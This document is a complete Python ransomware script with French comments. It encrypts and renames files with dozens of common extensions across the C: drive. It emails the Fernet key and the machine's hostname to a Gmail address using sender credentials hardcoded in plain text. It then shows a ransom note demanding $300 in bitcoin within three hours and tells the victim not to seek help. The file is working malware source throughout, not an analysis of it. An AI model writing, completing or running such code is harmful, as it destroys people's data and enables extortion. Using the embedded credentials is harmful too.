#!/usr/bin/python3
from getpass import getuser
from socket import gethostname  # Importer la fonction gethostname pour obtenir le nom d'hôte
from os import walk, path, rename  # Importer les fonctions walk, path, rename
from subprocess import call  # Importer la fonction call du module subprocess
from cryptography.fernet import Fernet  # Importer la classe Fernet du module cryptography.fernet
from win32ui import MessageBox  # Importer la classe MessageBox du module win32ui
from win32con import MB_ICONWARNING  # Importer la constante MB_ICONWARNING du module win32con
import smtplib  # Importer le module smtplib pour envoyer des emails
from email.mime.text import MIMEText  # Importer MIMEText pour créer le contenu de l'email
from email.mime.multipart import MIMEMultipart  # Importer MIMEMultipart pour créer un email multipart

# Fonction pour obtenir les extensions de fichiers
def get_extensions() -> list:
    return [
        ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp", ".sc2save", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb",
        ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".tax",
        ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", ".itm", ".sb", ".fos", ".mcgame", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
        ".menu", ".layout", ".dmp", ".blob", ".esm", ".001", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x",
        ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0",
        ".DayZProfile", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav",
        ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", ".unity3d", ".wotreplay", ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css",
        ".rb", ".png", ".jpeg", ".txt", ".p7c",".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d",
        ".rw2", ".rwl", ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw",
        ".3fr", ".dng", ".jpe", ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf", ".pdd",".psd", ".dbfv", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg",
        ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm",".xlsx", ".xls", ".wps", ".docm", ".docx",
        ".doc", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"
    ]

# Extensions à chiffrer/déchiffrer
extensions = get_extensions()

# Fonction pour chiffrer les fichiers
def encrypt_files(key: bytes):
    f = Fernet(key)
    for root, dirs, files in walk("C:\\"):
        for file in files:
            fpath  = path.join(root, file)
            ext = path.splitext(fpath)[1]
            if ext in extensions:
                try:
                    with open(fpath, "rb") as of:
                        original = of.read()
                    encrypted = f.encrypt(original)
                    with open(fpath, "wb") as of:
                        of.write(encrypted)
                    filename = f.encrypt(file.encode())
                    newpath = path.join(root, filename.decode())
                    rename(fpath, newpath)
                except:
                    pass

# Fonction pour déchiffrer les fichiers
def decrypt_files(key: bytes):
    f = Fernet(key)
    for root, dirs, files in walk("C:\\"):
        for file in files:
            fpath  = path.join(root, file)
            ext = path.splitext(fpath)[1]
            if ext in extensions:
                try:
                    with open(fpath, "rb") as of:
                        encrypted = of.read()
                    decrypted = f.decrypt(encrypted)
                    with open(fpath, "wb") as of:
                        of.write(decrypted)
                    filename = f.decrypt(file.encode())
                    newpath = path.join(root, filename.decode())
                    rename(fpath, newpath)
                except:
                    MessageBox("The inserted key is wrong.", MB_ICONWARNING)
                    return

# Fonction pour envoyer la clé par email
def send_key_via_email(key: str, recipient: str):
    sender = "klogger810@gmail.com"
    password = "ldmj xpqq bahe lhvn"
    subject = "Decryption Key"
    hostname = gethostname()
    body = f"Here is the decryption key: {key}\nFor the computer with ID: {hostname}"

    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender, password)
        text = msg.as_string()
        server.sendmail(sender, recipient, text)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Fonction principale
def main():
    key = Fernet.generate_key()
    f = Fernet(key)
    hostname = gethostname()

    # Envoyer la clé par email
    send_key_via_email(key.decode(), "loggerkey285@gmail.com")

    # Chiffrer les fichiers
    encrypt_files(key)
 
 # Message d'avertissement et instructions de sauvegarde
    
    print("All of your important files have been encrypted\n"
        "You have 3 hours to send 300$ in bitcoins to this address -> www.example.com.\n"
        "If you do not, all of your important data will be sold, all of your passwords will be sold\n"
        "IMPORTANT!\n"
            "You'll need this for decrypting your files.\n"
            f"This is your id, {hostname}, put this somewhere safe, because when you'll send the money we will need this.\n"
            "All of your important files have been encrypted, there's no way you can get them back except one.\n"
            "For getting all of your files back you need to send 300$ in bitcoin to this address -> www.example.com.\n"
            "After you've paid the 300$ you'll eventually get your files back, don't try to do these things:\n"
            "1) Decrypt the files yourself.\n"
            "2) Seek for help.\n"
            "3) Send less money.\n"
            "4) Forget, delete, or lose your id.\n"
            "Good luck.")

    
    # Demander la clé de déchiffrement à l'utilisateur
    while True:
        input_key = input("Veuillez entrer la clé de déchiffrement : ").encode()
        try:
            f = Fernet(input_key)
            decrypt_files(input_key)
            print("Votre système a été déchiffré avec succès.")
            break
        except Exception as e:
            print("Clé de déchiffrement incorrecte, veuillez réessayer.")

    
            
if __name__ == "__main__":
    main()
